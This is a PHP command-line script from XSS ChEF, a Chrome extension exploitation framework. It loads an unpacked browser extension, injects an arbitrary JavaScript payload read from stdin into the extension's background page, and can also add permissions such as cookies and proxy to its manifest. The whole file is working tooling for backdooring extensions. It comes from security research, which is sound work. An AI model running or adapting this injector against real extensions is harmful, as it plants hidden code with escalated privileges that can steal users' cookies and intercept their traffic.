#!/usr/bin/env php
<?php
/*
   XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
require_once __DIR__ . '/ChromeExtensionToolkit.php';

try {
    if (empty($argv[1])) {
        throw new Exception("Usage:\n\n{$argv[0]} <extension-path> [permissons] < script.js

Example:
{$argv[0]} dir-with-extension 'plugins,proxy,cookies' < script.js
");
    }
    
    $extpath = $argv[1];
    $t = new ChromeExtensionToolkit($extpath);
    
    echo "Loaded extension in $extpath\n";
    
    $manifest = $t->getManifest();    
    echo "Existing manifest: ";
    print_r($manifest);
    echo "\n";

    $t->assertBackgroundPage($manifest, 'bckg');
    
    // injecting any script from stdin
    echo "Reading payload...\n";
    $payload = file_get_contents('php://stdin');
    echo "Injecting...\n";

    $injected = $t->injectScript($payload);
    
    if (!empty($argv[2])) { 
        $perms = explode(',', $argv[2]);
        echo "Adding permissions...\n";
        // add permissions
        $new_properties = array(
            'permissions' => $perms,
        );
    
        $t->setManifest(array_merge_recursive($t->getManifest(), $new_properties));    
    }

    
    echo "Saving...\n";    
    //write
    $t->saveFile($t->getBackgroundPage(), $injected);
    $t->saveManifest();
    echo "Done.\n";
} catch (Exception $e) {
    file_put_contents('php://stderr', $e->getMessage() . "\n");
    exit(1);
}
?>